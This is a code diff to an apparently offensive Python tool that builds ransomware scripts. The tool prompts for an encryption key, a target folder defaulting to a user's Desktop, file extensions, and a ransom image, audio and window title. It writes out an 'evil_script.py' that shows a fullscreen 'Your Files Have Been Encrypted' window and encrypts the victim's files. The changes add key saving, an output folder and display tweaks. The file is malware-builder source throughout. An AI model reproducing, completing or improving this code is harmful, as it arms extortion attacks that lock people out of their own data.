@@ -1,9 +1,8 @@
 #!/usr/bin/env python3
 import base64
-import sys
-import os
+import time
+from pathlib import Path
 from os.path import isfile
-sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..')))
 from UI.indicators import print_info, print_prompt, print_warning, print_success
 
 
@@ -35,11 +34,20 @@ def generate_ransomware_script():
         validate=lambda k: len(k.encode()) == 16,
         error_msg="Key must be exactly 16 bytes."
     )
+
+    crypto_utils_dir = Path(__file__).resolve().parent.parent.parent / "crypto_utils"
+    crypto_utils_dir.mkdir(parents=True, exist_ok=True)
+    key_filename = crypto_utils_dir / f"key_{int(time.time())}.txt"
+    with open(key_filename, "w") as keyfile:
+        keyfile.write(key)
+    print_success(f"Key saved to {key_filename}")
+
     method = prompt_input(
         "Encrypt all files or specific extensions? (all/some)", "all",
         validate=lambda m: m.lower() in ['all', 'some'],
         error_msg="Please enter 'all' or 'some'."
     ).lower()
+
     target_path = prompt_input("Path to encrypt", r"C:\Users\Name\Desktop\**")
 
     image_path = prompt_input(
@@ -55,11 +63,16 @@ def generate_ransomware_script():
         allow_empty=True
     )
     window_title = prompt_input("Window title", "Your Files Have Been Encrypted")
+
     output_filename = prompt_input(
         "Output file name", "evil_script.py",
         validate=lambda f: f.endswith(".py"),
         error_msg="Output filename must end with .py"
     )
+
+    output_dir = Path(__file__).resolve().parent.parent.parent / "output_scripts"
+    output_dir.mkdir(parents=True, exist_ok=True)
+    full_output_path = output_dir / output_filename
 
     image_b64 = ""
     if image_path:
@@ -91,7 +104,7 @@ def generate_ransomware_script():
             "def show_image():",
             "    root = tk.Tk()",
             "    root.title(WINDOW_TITLE)",
-            "    root.state('zoomed')",
+            "    root.attributes('-zoomed', True) if os.name == 'nt' else root.attributes('-fullscreen', True)",
             "    root.resizable(True, True)",
             "    def toggle_fullscreen(event=None):",
             "        is_fullscreen = root.attributes('-fullscreen')",
@@ -148,15 +161,8 @@ def generate_ransomware_script():
             ""
         ]
 
-    if image_b64:
-        script_lines.append(f"IMAGE_B64 = '''{image_b64}'''")
-    else:
-        script_lines.append("IMAGE_B64 = ''")
-
-    if audio_b64:
-        script_lines.append(f"AUDIO_B64 = '''{audio_b64}'''")
-    else:
-        script_lines.append("AUDIO_B64 = ''")
+    script_lines.append(f"IMAGE_B64 = '''{image_b64}'''")
+    script_lines.append(f"AUDIO_B64 = '''{audio_b64}'''")
 
     if image_b64:
         script_lines.append("threading.Thread(target=show_image).start()")
@@ -180,11 +186,10 @@ def generate_ransomware_script():
         script_lines.append(f"Victim.extlist = {extlist_formatted}")
         script_lines.append("Victim.Encrypt_Some_Ext(startpath)")
 
-    with open(output_filename, "w") as f:
+    with open(full_output_path, "w") as f:
         f.write("\n".join(script_lines))
 
-    print_success(f"Script saved as {output_filename!r}")
-
+    print_success(f"Script saved to {full_output_path}")
 
 if __name__ == "__main__":
     generate_ransomware_script()
